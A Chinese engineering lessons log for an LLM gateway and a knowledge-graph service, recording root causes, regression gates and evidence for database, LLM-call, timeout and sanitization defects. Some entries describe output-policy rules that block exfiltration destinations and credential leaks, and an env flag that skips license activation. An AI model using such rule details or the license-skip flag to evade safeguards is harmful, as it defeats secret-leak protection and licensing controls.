# 项目经验队列（LESSONS）

> 这里只记录可复用的返工、审查、验证或生产问题，并附可核验的证据。开工时先读相关条目；收尾时只新增可行动的发现，常规成功不必记一条。证据和晋级标准见 `.agents/rules/66-skill-evolution.md`。

## 待观察经验

### 2026-10-19 — 迁移文件头关于"生产列形态"的事实前提必须当场量（Seen: 1/3）
- 任务 / 缺陷：迁移 877 上线前的写放大定量决策（`docs/audit/2026-10-19-877-写放大定量决策.md`）。
- 根因：877 的 `.sql` 文件头与 `docs/db-changelog.md` 都断言「search_text 是 **TOAST 宽列**」，
  并据此推断 trigram 抽取成本"实际很可能显著更高"。生产只读实测**推翻了这条前提**：
  `session_turns_hot` 6,624 行 / `session_turns_2026_10` 227,088 行的 `length()` 是
  p50=81 / p90=117 / p99=145 / **max=148**，`pg_column_size` avg=93 —— 远低于 TOAST 阈值，
  该值**永远内联在 heap**。此前的 455 字符夹具因此**高估约 5.3 倍**。
  另一条被推翻的隐含前提：`show_trgm()` 返回的是 **distinct** 的 trigram，不是全部 3-gram
  （生产 avg=**84.59**/行，distinct 与 all 相等）。
- 防复发检查：任何以"生产某列是宽列/大值"为前提的**写放大、容量、构建时长**论证，
  必须先跑 `length()` / `pg_column_size()` 的分位数 + `show_trgm()` 计数，并把结果
  做成**夹具自检**（本轮实现：合成夹具的 distinct trigram 必须与生产实测在 ±12% 内，
  超差即报错而不是调断言）。超过 ±12% 时修夹具形状，不修判据。
- 证据：`sql/migrations/startup/migration_877_write_amplification_test.go`
  （夹具保真度自检，实测 85.10 vs 生产 84.59，偏差 +0.6%）；
  生产 PG 17.10 只读采样（2026-10-19）。
- 状态：待观察

### 2026-10-19 — WAL 是集群级计数器；GIN 的 WAL/行随测量窗口长度漂移（Seen: 1/3）
- 任务 / 缺陷：877 写放大的 WAL 口径。
- 根因：① `pg_stat_wal` 只有**集群级**口径，生产 PG 上 91 秒测到 +12.6 MB WAL，
  但那整个平台（crm-go / casdoor / kxmemory…）都在写，**无法归因到 `session_turns`**；
  ② GIN 索引页被持续改写 ⇒ 每次检查点后每个被改页要写一次 8KB **全页镜像（FPI）**，
  FPI 是"每页每检查点"的一次性成本，摊到多少行上取决于**测量窗口长度**。
  实测同一张表同一批数据：共享库交错测 14,844 B/行、顺序独占测（窗口前强制 CHECKPOINT）
  45,832 B/行、独立静库测 3,727 B/行 —— 差 12 倍。
- 防复发检查：WAL/行只能从**一次性库**测；生产侧归因用 `pg_relation_size` 的增量
  （可归因到单个索引）；报告 WAL 成本给**区间**并写明检查点节奏，
  绝不用单点值做容量决策。
- 证据：`sql/audit/2026-10-19-877-write-amplification-cross-check.sql`（独立静库交叉校验）
  与 `-factors.sql`（因子分解）；生产 `session_turns_2026_10_search_text_idx` 75MB /
  227,088 行 = **346 B/行**，与基准预测的 318~365 B/行一致。
- 状态：待观察

### 2026-10-19 — 一列只写不读同样是缺陷；消费方判据要覆盖四件（Seen: 1/3）
- 任务 / 缺陷：`sessions.duration_ms`（877 修好了写入侧）**零读侧**。
- 根因：写入侧门（`domains/session/v2/session_duration_ms_realdb_test.go`）只证明"值写对了"，
  没有任何门证明"有人读它"。只写不读的列没有对外契约，审计只能记成
  「诚实，但没有用户可见收益」。
- 防复发检查：新增/修复一个列时，**同一轮**必须接上读侧并让判据覆盖四件事：
  ① 结构体有该字段；② **json tag 正确**（tag 错 = 字段在 Go 侧存在、在 HTTP 侧不存在，
  前端读不到）；③ SELECT 真的选了那一列；④ Scan 真的扫进了那个字段
  （只声明字段不选列 ⇒ 恒零值；列选了不扫 ⇒ 值读不出来）。
  判据用 **go/ast** 而非文本扫描（注释进不来，本仓吃过"按裸子串切文件被自己注释绊倒"的亏）。
- 证据：`admin/session_duration_ms_consumer_test.go`；三条变异各自变红
  （去掉 SELECT 列 / 改错 json tag / 去掉 Scan 目标），复原后转绿。
- 状态：已修待观察

### 2026-10-19 — `sql/migrations/startup/` 下的非迁移 SQL 会被当成迁移部署（Seen: 1/3）
- 任务 / 缺陷：把 877 的基准脚本（交叉校验 / 因子分解）放进 `sql/migrations/startup/`。
- 根因：该目录是**启动迁移目录**，文件名以数字开头即被当成一个迁移号。
  `TestMigrationRegistryStaysContinuous` 当场报红：「877_write_amplification_cross_check.sql
  （编号 877，在近邻窗口 [859, 878] 内）未登记进 `docs/db-changelog.md` ……
  后果：该迁移会被**静默部署**（脚本 warn-only + 部署侧只查文件存在）」。
- 防复发检查：基准/审计/诊断 SQL 一律放 `sql/audit/`（已有 2026-10-02 的 db-audit 系列），
  不放 `sql/migrations/startup/`；`sql/README.md` 的目录说明要同步。
- 证据：迁移目录连续性门实测报红；改放 `sql/audit/2026-10-19-877-write-amplification-*.sql` 后转绿。
- 状态：已修待观察

### 2026-10-19 — 判据会把错误行为钉死：13 条既有断言在守"谎"（Seen: 1/3）
- 任务 / 缺陷：memora `internal/p3` 的 stub 处理器（另一仓，本轮同形处置）。
- 根因：p3 的 28 处 `TODO(batch-9+)` 长期返回 200 + **编造的成功形状**
  （`{"id":"stub","status":"created"}` / `{"count":0}` / `{"status":"accepted"}` /
  `{"deleted":true}`）。更隐蔽的是**已有判据在守它**：`batch9_test.go` 里 13 条断言
  要求这些路由返回 200 + 假成功 —— 判据把"什么都没发生"钉成了"已发生"，
  注释读起来很有理，但它在守的正是那个谎。
- 防复发检查：改一个路由的行为前，先 grep 该仓**既有判据**里对该行为的断言，
  连同注释里**论证结论的句子**一起改；新增"未实现"路由时同时登记到
  `p3StubRoutes`（运行时逐条打）与源码 AST 守卫（防漏登）两条；
  改完做变异验证（把 stub 改回 200 + 假成功 ⇒ 两道门都要红）。
- 证据：memora `internal/p3/stub_honesty_test.go`；变异实测两段各自报红
  （运行时门红在状态码，AST 门红在 `fabricated id "stub"` 与 `fabricated success status "created"`）。
- 状态：已修待观察

### 2026-10-19 — LLM 调用参数没对真实网关标定过：默认值在"抽取"这类批任务上两个都不够（Seen: 1/3）
- 任务 / 缺陷：memora dream cycle 首跑（接真实网关 `https://llm.kxpms.cn`，非 llm-mock）。
- 根因：抽取调用的两个参数都是**照抄通用默认值**，从未对抽取任务标定过：
  ① 超时用 `llm.Client` 的默认 **20s**（问答用的短请求预算）；
  ② `max_tokens=2000`（同样照抄通用默认）。
  实测 12 条 observation 拼成的抽取 prompt：**26.2s / 26.9s** ⇒ 被客户端掐断，
  错误是 `context deadline exceeded`；把 max_tokens 提到 8000 后
  `completion_tokens=2982` ⇒ 2000 这个上限**从一开始就不可能够**，
  输出被截断在 JSON 中间 ⇒ `malformed JSON`。
  ⇒ **两个坑的表象都是"抽取失败"，根因完全不同**（超时 vs 输出截断），
  只看"抽取失败"会以为是同一个问题。
- 防复发检查：任何**批处理型 LLM 调用**必须显式给 `Timeout` 与 `MaxTokens`，
  数值来自**对真实端点的实测**（含 `usage.completion_tokens`），不是默认值；
  判据要钉住**调用时真正传出去的 opts**（与被测对象同层），
  而不是"源码里有没有这个常量"——常量在不在都可能与实际行为脱节。
  ★ 实测值随批量线性涨（抽取输出随 observation 条数增长，而 observation 上限是 500），
  所以标定要按**最大批量**留余量，不能按"这次刚好够"。
- 证据：memora `internal/dream/extraction_params_test.go`
  （同层判据：断言 `opts.Timeout >= 60s` 与 `opts.MaxTokens >= 4000`；
  变异验证：删掉 `Timeout` 字段 → 门红 `timeout = 0s`；
  `MaxTokens` 回落到 2000 → 门红 `max_tokens = 2000`）；
  真实网关实测记录见 memora `internal/dream/engine.go` 的常量注释。
- 状态：已修待观察

### 2026-10-19 — 真实环境的模型名会漂移：可选项必须"当场拉清单 + 当场实测"（Seen: 1/3）
- 任务 / 缺陷：同上首跑的模型选型。
- 根因：本轮开工时 `abab6.5s-chat` / `abab5.5-chat` 实测可用；几小时后再测变成
  `No available provider for model 'abab6.5s-chat'. All 6 candidates failed.`。
  而 `GET /v1/models` 当时列出 **27** 个模型，其中**多数调用即 503**
  （glm-5.3 / glm-5-turbo / glm-4.7 / nemotron-3-super / nemotron-3-ultra 均实测 503）。
  ⇒ **"模型在清单里" ≠ "模型可用"**，也 ≠ **"模型遵守你要的输出 schema"**。
- 防复发检查：选模型必须三步实测——① 拉 `/v1/models` 清单；② 对候选逐个发**真实形状**
  的请求；③ 按**消费方的解析语义**评判返回（不是"是不是 JSON"）。
  ★ 尤其要区分"JSON 合法"与"**键名与消费方期望的一致**"：
  本轮实测 `deepseek-v4-flash` 返回 `{"nodes","edges"}`、`glm-4-flash` 返回
  `{"knowledge_graph"}`/`{"events"}` —— 都是**合法 JSON**，但消费方一个都取不到。
  ⇒ 判别动作：**用消费方的解析器判返回，不要用"能不能 parse"判。**
- 证据：memora `internal/dream/extract.go` 的 `ParseExtraction` 键名口径
  （`entities`/`facts`/`relationships` + 别名）；本轮 20 个模型的逐个实测记录。
- 状态：待观察

### 2026-10-19 — mock 夹具的列数是写死的 ⇒ "SELECT 掉列"这类缺陷它测不出来（Seen: 1/3）
- 任务 / 缺陷：接上 `sessions.duration_ms` 消费方时给 `admin/session_detail_v2_test.go` 补夹具。
- 根因：pgxmock 的返回列由**夹具写死**。生产代码把 `s.duration_ms` 加进 SELECT（27→28 列）
  而夹具仍造 27 列 ⇒ pgx 报 `incorrect argument number 28 for columns 27`，
  4 条既有测试变红（这是**夹具**该跟，不是生产代码错）。
  ★ 但反过来更值得记：**把 SELECT 里的列删掉，这条夹具仍然全绿**
  —— 夹具照旧返回 28 列，Scan 照旧拿 28 个目标，位置对得上 ⇒ 测试察觉不到。
  ⇒ 于是"值断言"与"AST 门"**各管一半，缺一不可**：
  值断言管"Scan 目标与列的对应关系正确"（抓错位），
  AST 门管"SELECT 里确实有这一列"（抓掉列）—— 任何一边单独存在都是半盲的。
- 防复发检查：给 mock 补列时，同时确认**两道门各覆盖一个方向**；
  写完判据要问一句"**这条判据在哪种真实缺陷下仍会全绿**"，并把答案写进注释
  （本轮把"本门抓不到 SELECT 掉列"直接写进了新判据的注释）。
- 证据：`admin/session_detail_v2_test.go`（`TestQuerySession_ReadsDurationMs` +
  夹具补 `duration_ms` 列）与 `admin/session_duration_ms_consumer_test.go`（AST 门）。
- 状态：已修待观察

### 2026-10-20 — 「换个模型才显形」的缺陷：验收要覆盖模型谱系，不是一个能用的模型（Seen: 1/3）
- 任务 / 缺陷：memora dream cycle 真实网关首跑的续轮。
- 根因：首轮用的 `sensenova-6.8-flash-lite` **恰好**同时满足"守 schema + 慢"，
  于是另外三类问题全都藏在它后面。换网关在架的旗舰模型 `minimax-m3` 才暴露：
  ① 它在 `response_format=json_object` 下仍先输出 `<think>…</think>` ⇒ 解析直接失败；
  ② 它用 `type` 而不是 `entity_type` ⇒ 实体类型全塌成 other；
  ③ 它更慢（82.9s）⇒ 撞上服务端 `WriteTimeout: 60s`。
  ⇒ ★ **"这个模型能跑通"不等于"这条链路健壮"** —— 第一个试通的模型会把
  后面所有问题都藏起来。
- 防复发检查：给 LLM 链路做验收时，**至少覆盖两类形态**：
  ① 守 schema 的（键名与 prompt 一致）；② 不守的（别名键名 / 带推理前缀 / 输出更长）。
  判别动作：**先拉网关在架模型清单，再对每类形态各挑一个实测**，
  而不是"找一个能用的就用"。
  ★ 反面教训同源：`<think>` 前缀这类问题**只在换模型时**显形，
  所以"当前默认模型能用"是一条会过期的证据。
- 证据：memora `internal/llm/think_prefix_test.go`（用逐字取自实测的 think 前缀
  响应走真 HTTP 往返）、`internal/dream/entity_type_alias_test.go`、
  `internal/dream/write_deadline_test.go`；真实网关复验：
  修复前 `http_code=000` + 全 other，修复后 `http_code=200` + 正常分布。
- 状态：已修待观察

### 2026-10-20 — HTTP 写超时会把「成功」变成「失败」：报错不等于没做完（Seen: 1/3）
- 任务 / 缺陷：同上续轮。
- 根因：抽取实测 26.2s ~ 82.9s，而网关 `http.Server` 写着
  `WriteTimeout: 60 * time.Second` ⇒ 超过 60s 的请求**响应写不出去**：
  客户端拿到 `http_code=000`（Go 客户端收到 `EOF`），**而 cycle 跑完了、
  数据也全部落库了**。现场表现是「成功长得和失败一模一样」：
  调用方看到报错，合理地重试，于是每重试一次多出一个 episode
  （每次 run 生成新的 uuid）。
- 防复发检查：凡是把一个**长耗时操作**挂在同步 HTTP 上，必须同时核对三处超时：
  ① 服务端 `WriteTimeout`；② 前置代理的 `proxy_read_timeout`（nginx 默认也是 60s）；
  ③ 客户端自己的超时。★ 修法优先**按路由延长**（Go 1.20+
  `http.NewResponseController`），不要抬全局 `WriteTimeout` ——
  全局抬高会让所有慢请求都失去上限。
  ★ 判别动作：**看到"请求失败"时，先确认服务端是不是没做完**
  （查日志里的完成记录 + 查数据是否已落库），再判定失败 ——
  否则会把"其实成功了"误判成"没跑成"，进而做出重试/回滚的错误动作。
- 证据：memora `internal/dream/write_deadline_test.go`（真路由 + 慢假 LLM +
  短 `WriteTimeout` 的测试服务器；变异"摘掉注册行"报出**与生产一致的 EOF**）。
- 状态：已修待观察

### 2026-10-20 — 「看起来有答案、实际是空集」：解析层丢字段，先问它有没有读方（Seen: 1/3）
- 任务 / 缺陷：同上续轮（`entity_type` 别名）。
- 根因：模型返回 `{"name":"alice","type":"person"}`，解析只认 `entity_type`
  ⇒ 类型全塌成 `"other"`。抽取报 `completed`、图也写了、**没有任何错误**。
  但 `entity_type` 是**有真读方**的过滤键（`pgstore/read_queries.go` 的
  `n.entity_type = $5`，并由 `/api/graph/entities?entity_type=…` 暴露）
  ⇒ 按类型查询**静默返回 0 行**：看起来像"没有这类实体"，
  实际是"类型信息在解析阶段就丢了"。
- 防复发检查：★ 判别动作：**解析层丢掉一个字段时，先问"这个字段有没有读方"**：
  有读方 ⇒ 是缺陷（**静默错误**，比报错更难查）；没有读方 ⇒ 才只是观感问题。
  ⇒ 对 LLM 返回做键名兼容时，别只盯着"能不能 parse"，
  还要盯**消费方实际按哪些键取值**。
  ★ 判据要**按消费方的过滤语义**写（"别让类型全塌成 other"），
  而不是只断言"解析没报错"。
- 证据：memora `internal/dream/entity_type_alias_test.go`
  （用实测原样 payload；变异"去掉 type 别名"报红
  `EntityType = "other", want "person"`）。
- 状态：已修待观察

### 2026-10-20 — 「接口支持 X」≠「X 会生效」：透传型支持必须用端到端证据验（Seen: 1/3）
- 任务 / 缺陷：memora dream cycle 的 schema 约束路线评估（真实网关）。
- 根因：网关的 `adapter/unified/interface.go` 定义了 `JSONSchema` 类型，
  `convertResponseFormat` 会把它**原样透传**给上游 —— 于是很容易得出
  "网关支持 json_schema ⇒ 可以用它把模型输出约束住"的结论。
  ★ 实测**不成立**：对真实网关发
  `response_format={type:"json_schema", json_schema:{…,"strict":true}}`
  （schema 带 required + `additionalProperties:false` + enum），
  网关**照收不误**，但模型**完全无视**：
  minimax-m3 返回的仍以 `<think>…</think>` 开头
  （completion_tokens=2337 / reasoning_tokens=381）；
  另一次 glm-4 的 json_schema 返回**不是对象**（completion_tokens=292），
  随后 4 次重试全 503。
  ⇒ 这里的 `JSONSchema` 只保证**能传过去**，不保证**对端会执行**。
- 防复发检查：★ 判别动作：凡是要靠"某层支持某能力"来简化上层逻辑，
  必须有一条**端到端证据**（真发一次、真看对端行为），
  不能只看**类型定义/字段存在**就说"有这能力"。
  ★ 尤其要区分**语法透传**（字段被原样转发）与**语义执行**（对端真的按它约束）。
  ⇒ 写进文档的"解法"如果建立在未经验证的能力上，它会变成**反向的误导**：
  让人以为可以放松下游的兜底逻辑。⇒ 下结论前先问：
  "这条能力我**实测过**吗？还是我只是**看到它有定义**？"
- 证据：真实网关实测（2026-10-20，211 发起）——
  minimax-m3 + `json_schema` + `strict:true` 仍返回 think 前缀；
  glm-4 + `json_schema` 返回非对象且随后连续 503。
  结论已写回 `docs/audit/2026-10-19-dream-cycle-首跑.md` 的遗留项
  （原文曾把"走 json_schema"写成"真正的解法"，已按实测订正）。
- 状态：已修待观察

### 2026-10-20 — 客户端看到明文 ≠ 泄漏：脱敏验收必须看「上游实收」（Seen: 1/3）
- 任务 / 缺陷：154（`llm.kxpms.cn`）脱敏与恢复多轮验收；同轮查实并修掉 r1036（地址规则把「标签+号+数字」整段吞成单个 `custom` 占位符，类型从 phone 退成 custom）。
- 根因（验收方法）：只看**客户端响应**会得出完全相反的结论——模型回复里出现明文手机号，看起来像泄漏。真实链路是「输入替换占位符 → 上游收到占位符 → 上游回占位符 → 网关还原 → 客户端拿原文」，客户端看到明文**正是还原链在工作**的证据。判据必须落在上游侧：raw 落盘的 `direction=upstream_request`（上游实收）+ Redis 脱敏映射表 `session:<tenantHash>:<sid>:sanitize`（占位符确实产生）。这是 r1014「允许侧假绿」的镜像形态。
- 防复发检查：脱敏验收三路证据缺一不可（上游实收 / 上游实回 / 客户端可见）；`input_sensitive` 字段是 MiniMax 上游自带的，**与网关脱敏无关**，拿它当判据会误判「没脱敏」；地址类判据必须用 `NewPatternDetectorFromFile(configs/sensitive_patterns.yaml)`——内置 fallback 无地址规则，用它写判据恒绿（r1010 教训，本轮再次命中）。
- 证据：`docs/audit/2026-10-20-154-sanitize-restore-multi-round-acceptance.md`；判据 `security/sanitize/r1036_label_suffix_address_test.go`；修复 `security/sanitize/detector.go` 的 `dropLabelWrappedAddressFragments`。
- 顺带查实（非本轮缺陷，别当脱敏问题查）：gpt-6-luna 在 154 无候选 = 凭据 3 `quota_state=permanently_exhausted` → `v_routable_credential_models.is_routable=false` → 候选 SQL 硬排除 `AND v.is_routable = TRUE`；内网 IP 明文 = `server_ip` 已于 `ce5e35ab3` 移出 `ScopeRedact` 的既定设计；`_request_logs_hot` 0 行 = `storage.request_logs_write_enabled=false` 的 S4 停写门控。
- 状态：修复已落地本地，**未部署 154**。

### 2026-10-17 — 顶栏 X 不关 AppSheet / Focus；/me 先开后跳会被导航清掉
- 根因：`HyperApp.overlayActive` 只认 drawer/account，忽略 `Hyper.topOverlay`；`closeActiveOverlay` 未走 `dismissOverlay`。`/me` 若先开 Sheet 再 `replace('/')`，runtime 导航 silent-close 全 overlay。
- 防复发：overlay 顶栏 X 必须绑定 `Hyper.topOverlay` + `dismissOverlay`；账户兼容路由先 replace 再派发 `llmgw:open-account`。判据 `HyperApp.overlayClose.spec.ts`。
- 证据：Android CDP — OpenRouter 详情 `topbar-close-overlay` 可关；`/m/me` 打开账户 Sheet 含生产/测试/内部三站点。
- 溯源：本会话 web-mobile 热修 + 245/154 `web-mobile` 热补丁。

## 2026-10-17 — Bash 路径里的版本四元组不是外传目的地（Seen: 1/3）
- 任务 / 缺陷：ZCode/MiniMax 装 JDK/Maestro 时 Bash 参数含 `jdk-17.0.20.1+1`，整条 `output_policy_blocked`（request `ecb14454…`）。
- 基线 / 修复 SHA：生产取证在 2693；修复 `c07632314`（r1033），154=`2695-c0763231`（8781）。
- 根因：`server_ip` 的 `\b` 在 `-`/`+` 处仍成词界，把版本号当成 Apple 公网段 IP；r1020b 曾登记为残留。
- 防复发检查：邻接字符豁免（前邻 token 粘连或后邻 `+`）；正负对照裸公网 IP/URL 主机位仍拦；变异撤 `isVersionTokenGlue` 前邻分支必须红。
- 证据：`TestR1033*`；154 E2E `tool_choice=Bash` + JDK 路径流式 `finish_reason=tool_calls` 无阻断；二进制含 `isPathOrVersionEmbeddedAddress`。
- 状态：已修复待观察

## 2026-10-17 — Magpie 空回复要对齐 chat 与 Responses 两腿（Seen: 1/3）
- 任务 / 缺陷：154 `minimax-m3` / `empty_model_response`；Responses 桥已有 Magpie 语义，chat 腿仍把空 `tool_calls` 幻影当成功。
- 基线 / 修复 SHA：生产 2682 复现；修复 `85f81dba9`，部署 154=`2684-85f81dba`（8781）。
- 根因：`ChatChunkHasOutput` 对任意非空 `tool_calls` 数组计语义 → 空流 early-empty 计数被重置 → benign-EOF 伪成功；客户端报 `empty_model_response`，网关不换候选。
- 防复发检查：幻影（空 name/arguments）与具名 tool 正负对照；chat gate EOF（finish 无 [DONE]）必须 `KindEmptyResponse`；Responses 与 chat 两腿同测。
- 证据：`TestChatChunkHasOutput/phantom`、`TestRunEmptyStreamGatePhantomToolCallsTriggerEarlyEmpty`、`TestR1028ChatPhantomToolCallsFinishWithoutDoneFailsOver`；二进制含 `Magpie emptyReply failover`。
- 状态：已修复待观察

## 2026-10-17 — Chrome 打开 llm.itestu.cn「意外终止连接」= QUIC + 代理 CONNECT（Seen: 1/3）
- 任务 / 缺陷：Chrome 报无法访问/连接被意外终止；Safari/curl 正常。
- 根因：① Chrome 默认尝试 HTTP/3(QUIC) 打 UDP:443，211 nginx 只听 TCP HTTP/2，失败时表现为连接终止；② 即便回落 HTTPS，系统代理 7894 的 HTTP CONNECT 到 `192.168.31.211:443` 在 TLS 握手 EOF（SOCKS/直连正常）。IP 段旁路对「按主机名进代理」无效。
- 防复发检查：系统代理 Exceptions 含 `*.itestu.cn`/`llm.itestu.cn`；`defaults write com.google.Chrome QuicAllowed -bool false`；mihomo 规则 `DOMAIN,llm.itestu.cn,DIRECT`；验证用 `--disable-quic` 对照 + curl `--proxy http://127.0.0.1:7894` 应仍可接受失败但直连 200。
- 证据：`--disable-quic` 后标题变「AI Native 组织核心网关」；CONNECT 路径 LibreSSL SSL_ERROR_SYSCALL；bypass 写入后 scutil ExceptionsList 含 `*.itestu.cn`。
- 状态：本机已落地待观察（network-switch 重写系统代理时可能冲掉 bypass，需盯）

## 2026-10-17 — 211 未钉 LICENSE_ACTIVATED 时 SPA 卡 /bootstrap（Seen: 1/3）

- 任务 / 缺陷：deploy-211 后 llm.itestu.cn「打不开」；Safari 落在 `/bootstrap?redirect=…`，登录页进不去。
- 根因：211 独立库 + 容器硬件指纹在 license 表无对应行；`/api/system/bootstrap/status` 返 `activated:false`；`web/src/router.ts` 软门把非 `/login|/bootstrap` 路径重定向到激活向导。154/245 靠库内 license 行，本地曾用 `LLM_GATEWAY_LICENSE_ACTIVATED=1` 绕过。
- 防复发检查：`deploy-211-docker.sh` 同时写 gateway.env 与容器 `-e LLM_GATEWAY_LICENSE_ACTIVATED=1`；契约门钉两处；部署后断言 `bootstrap/status.activated=true` 且浏览器落到 `/?login=1` 而非 `/bootstrap`。
- 证据：修前 activated=false + Safari `/bootstrap`；deploy-211 重跑后 env=1、activated=true、登录 6/6、Safari `https://llm.itestu.cn/`、契约 87/0。
- 状态：已修待观察

## 2026-10-17 — 211 部署基础镜像必须钉 registry-211，readyz 无 mode 字段（Seen: 1/3）
- 任务 / 缺陷：优化 deploy-211 走 registry-211.itestu.cn 基础镜像并部署验证。
- 根因：引擎默认曾回落 `golang:1.27.1-alpine`/`docker.io`；211 直连 docker.io 不通。runtime `alpine:3.22` 原先只在 `/opt/kaixuan/base-images` 离线包，registry 仅有 `lang-base/alpine:3.18-i386`。readyz 实为 `status+database.connected+redis.connected`，没有 `mode` 字段——按 mode=full/lite 断言会得到 unknown 假象。
- 防复发检查：`deploy-211.sh` export + 引擎默认钉 `lang-base/kx-base-golang:1.27-alpine-amd64` 与 `lang-base/alpine:3.22-amd64`；构建前 `dd_ensure_base_images`（pull→离线 retag，2026-10-20 引擎泛化后由 `d211_` 前缀改为 `dd_`）；契约门钉默认字符串与 ensure；就绪验 DB/Redis connected 并拒绝 mode=lite 字面。
- 证据：契约门 83/0；实部署 build FROM registry-211 两基础镜像；应用镜像推送 `app-images/llm-gateway-go:211-17f66c69-dirty`；readyz DB/Redis connected、healthz ready、SPA text/html。数据面静态/admin key 仍 401（库血统 SECRET 对齐属既有项，非本轮镜像路径回归）。
- 状态：镜像路径已验证；鉴权对齐待观察

## 2026-10-16 — 探针必须保留真实状态与模型作用域（Seen: 1/3）
- 任务 / 缺陷：211 grok-4.6 路由诊断与节点状态修正；基线 `587af94bdf29b942c7d7051f4562955d83b12115`。首版 `7fc04b6e18dd3759ca9855e9b4316675ad672b40` 独立审查失败，追加隔离写回与余额门后重新审查，不沿用旧批准。
- 根因：生成探针把 401/403 合并成同一前缀，分类先按403判鉴权；具名404报文也未命中连续的 model not found。额度/模型权限被误挂为凭据级故障。resolve遗漏了dispatch仍在使用的credential circuit gate；健康写通的no-op条件遗漏被清空的错误字段。
- 防复发检查：保留协议与实际HTTP状态；额度、模型绑定、真正鉴权及模糊403分别配正负对照；排序测试先证明Router确实保留待过滤节点；SQL清理条件覆盖每个被清空字段。不以Ping其他模型成功证明目标模型可用。
- 证据：`TestCredentialProbe211Classification` 54个HTTP本地回放子例；撤额度识别6条红、过度豁免24条红后还原；`TestApplyURSMOverlayAppliesCredentialGate` 与 `TestLivePlanOrderFiltersCredentialCircuitAndCompactsRanks`；`TestHealthyCredentialSQLGuardCoversEveryClearedColumn`。初始211快照18个陈旧错误凭据，后续读数28；有效数据面请求未复现（现有凭据401），不能把模拟回放写成公网恢复。
- 状态：修复待观察；线上永久额度枯竭不因分类变更自动变成可用。

## 2026-10-15 — 本地化验收要覆盖底层解析异常（Seen: 1/3）
- 任务 / 缺陷：Magpie第二轮browser-use验收；非法URL透出浏览器原生英文，语义拒绝又透出工具函数硬编码中文。
- 基线 / 修复 SHA：部署 `369817bd2` / 2658 实测发现；修复 `98eeb903cdb13b1db05f05ee79cc1c5fdf53a8f0`。
- 根因：组件翻译了自身错误，但共享校验器与原生URL异常仍用自由文本；仅toThrow断言证明拒绝，不能证明错误语义/语言。
- 防复发检查：共享校验用稳定错误键；畸形URL与安全语义拒绝分别断言精确键；切语言重绘既有错误且保留输入；同时确认未revealKey/生成产物。
- 证据：URL6例/provider5例修前精确键断言红；修后39项绿；去解析映射及恢复provider明文变异分别红；独立浏览器实际交互发现遗漏。
- 状态：已修复待观察

## 2026-10-15 — 安全工具链升级需同步 vendor 与实际构建入口（Seen: 1/3）
- 任务 / 缺陷：[Magpie第二轮审计](docs/audit/2026-10-15-magpie第二轮审计与完善.md)；Go1.27.1与x/net可达漏洞门。
- 基线 / 修复 SHA：集成基线 `d63d9dcf959aa06143923e33cf637c4da047df1a`，修复 `76579bef134c762c88dd577baf2c16a5d072bf12`。
- 场景与影响：Go测试/构建通过后，govulncheck仍检出13项可达标准库漏洞；只改mod会被旧tracked vendor拒绝，旧CI补丁版与GOTOOLCHAIN=local也不会自动切新SDK。
- 根因：源码依赖、vendor、编译器与CI/镜像入口是独立约束，任一旧层都能阻断或偏离安全升级。
- 防复发检查：同步MVS最小依赖与vendor，生成两遍比哈希；更新活动CI并显式选择修复SDK；扫描默认vendor模式及独立模块，部署后读实际产物go version -m。
- 证据：两模块Go1.27.2扫描均0可达；vendor两次5853文件哈希一致；x/net0.60与配套版本由官方模块依赖边确认，未运行tidy。
- 状态：已修复待观察

## 2026-10-15 — 验证矩阵继承父环境，主门每次都在错误分支早退（Seen: 1/3）
- 任务 / 缺陷：[Magpie第二轮审计](docs/audit/2026-10-15-magpie第二轮审计与完善.md)；verify cgo契约。
- 基线 / 修复 SHA：基线 `c708260d0514befacacfdd18f83429f80bfc98f6`，修复 `9257aefa5f165d78e9786456f7d0454858a09b78`。
- 场景与影响：verify先export CGO_ENABLED再调用契约测试，默认入口在Linux模拟分支红，强制cgo入口在Darwin默认分支红，后续全量验证从未开始。
- 根因：单例测试未先清父环境；另用nocgo依赖图查cgo专属边界，前置错误修掉后才暴露第二层假红。
- 防复发检查：每个矩阵子shell先清目标变量再显式预设；动态依赖查询显式指定被登记形态；父环境0/1污染与自然完成对照都要在场。
- 证据：`tests/verify_cgo_convention_test.sh` 五种环境完整门RC0；去unset与去go-list形态钉扎变异分别在污染/空依赖断言红。SDK26.5+cgo1真实SQLite测试RC0，不能把旧SDK不可用当永久前提。
- 状态：已修复待观察

## 2026-10-15 — 脱敏工具脚本与人工凭据声明必须区分作用域（Seen: 1/3）
- 任务 / 缺陷：r1034，MiniMax 合法 sed 脱敏命令被 output_policy_blocked；原始人工账号/密码组合漏脱敏。
- 基线 / 溯源：`14d9fed9c0b801a5ef2d71feae6417835fa77903`；`docs/superpowers/specs/2026-10-15-minimax-policy-credentials-design.md`。
- 根因：凭据赋值正则把 sed 匹配表达式当真值；前置守卫单测未覆盖后置检查器对 JSON 转义和半截参数的处理；去引号后问句/变量豁免又可能误放真实字面口令。
- 防复发检查：匹配段与替换段均证明无秘密才屏蔽；人工自然语言规则只进输入；断言映射含完整真值；保留原始引号语义并匹配完整分隔词，避免“改为”被后缀“为”当问句。工具JSON解码不得静默丢弃重复键。允许侧同时跑真实合规全链及秘密/数字/键的反向样本，校验同属主策略。
- 证据：`TestR1034Production1971ByteArguments`、`TestR1034ThreeProtocolStreamsRestoreHumanInput`、`TestR1034HumanCredentialDeclarationsRoundTrip`、`TestR1034ToolShapeRedactionHonorsOwnerPolicy`；撤除关键修复会在对应断言变红。
- 状态：观察中

## 2026-10-15 — probeOne 进程级 MemoryFlight + holdTimeout TTL → 包测串味（Seen: 1/3）
- 任务 / 缺陷：`TestExecutor_NoCandidateProbe_HonorsClientCancel` 单独绿、连跑红
- 基线 / 修复 SHA：合入 main 的 24h 审计提交（基线 magpie `9ea45f7f8`）
- 场景与影响：同包先跑 NoCandidateProbe 后，Cancel 测报 ProbeSync never called
- 根因：`defaultMemoryProbeOneFlight` 进程单例；`TryAcquire(model, holdTimeout)` 无 Release
- 防复发检查：单飞默认 per-Executor 惰性 memory；钉子 `TestDefaultProbeOneFlightIsPerExecutor`
- 证据：连跑组修前红 / 修后 `go test ./domains/streaming/executors/ -count=1` RC=0
- 状态：观察中

## 2026-10-15 — session_online ⋈ 停写后视图 → EXPLAIN 52s/0 行（Seen: 1/3）
- 任务 / 缺陷：dashboard `/api/admin/sessions/online` 5s→500
- 基线 / 修复 SHA：本轮 24h 审计（生产 252 EXPLAIN）
- 场景与影响：视图臂 `id` 对 session 行为 NULL；`session_last_requests` 0 行仍付规划代价
- 根因：S4 后仍 JOIN `request_logs_with_current_month` 取 tenant
- 防复发检查：改读 `session_summaries`；钉子禁 `request_logs_with_current_month` / `session_last_requests`
